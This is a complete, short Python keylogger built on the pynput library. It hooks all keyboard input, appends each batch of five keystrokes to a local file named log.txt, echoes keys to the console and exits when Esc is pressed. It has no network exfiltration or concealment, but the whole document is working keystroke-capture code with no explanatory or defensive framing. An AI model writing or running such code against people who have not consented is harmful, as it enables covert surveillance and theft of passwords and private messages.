import pynput
import sys

from pynput.keyboard import Key, Listener


count = 0
keys = []


def on_press(key):
    global keys, count

    count += 1
    keys.append(key)

    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

    print(key)


#key realease, exit listener loop (ends program)
def on_release(key):
    if key == Key.esc:
        return False


#writes to the file log.txt
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            if str(key) == 'Key.enter':
                f.write('\n')
            else:
                f.write(str(key))

#Main loop calls functions
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
